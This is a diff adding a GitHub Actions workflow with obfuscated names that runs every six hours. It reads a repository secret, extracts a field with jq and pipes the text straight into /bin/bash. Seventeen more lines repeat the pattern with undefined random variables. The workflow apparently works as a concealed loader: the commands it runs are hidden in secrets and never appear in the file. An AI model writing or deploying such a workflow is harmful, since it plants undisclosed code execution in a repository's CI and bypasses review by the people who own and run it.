@@ -1,0 +1,34 @@
+name: renbminbimasike
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: renbminbimasike
+        env:
+          wquc0: ${{ secrets.wquc0 }}
+        run: |
+          echo $wquc0 | jq -r .hmdt43579 | /bin/bash
+          echo $f96023 | jq -r .vbvo65 | /bin/bash
+          echo $hk4 | jq -r .dmtmr59651 | /bin/bash
+          echo $zhrc91051 | jq -r .yvb79 | /bin/bash
+          echo $eeluv6 | jq -r .m0118 | /bin/bash
+          echo $hv5 | jq -r .mi0 | /bin/bash
+          echo $s6534 | jq -r .m9 | /bin/bash
+          echo $w930 | jq -r .wujr51646 | /bin/bash
+          echo $wqc7 | jq -r .ebqny6 | /bin/bash
+          echo $eneta2529 | jq -r .jbppv77831 | /bin/bash
+          echo $acpk85994 | jq -r .mibbw46888 | /bin/bash
+          echo $njg954 | jq -r .q66 | /bin/bash
+          echo $g845 | jq -r .pgsi0966 | /bin/bash
+          echo $yogf7499 | jq -r .o90 | /bin/bash
+          echo $phh9 | jq -r .ubpku9 | /bin/bash
+          echo $yqk0 | jq -r .zn92 | /bin/bash
+          echo $wn5131 | jq -r .h1925 | /bin/bash
+          echo $raa671 | jq -r .gru8435 | /bin/bash
+
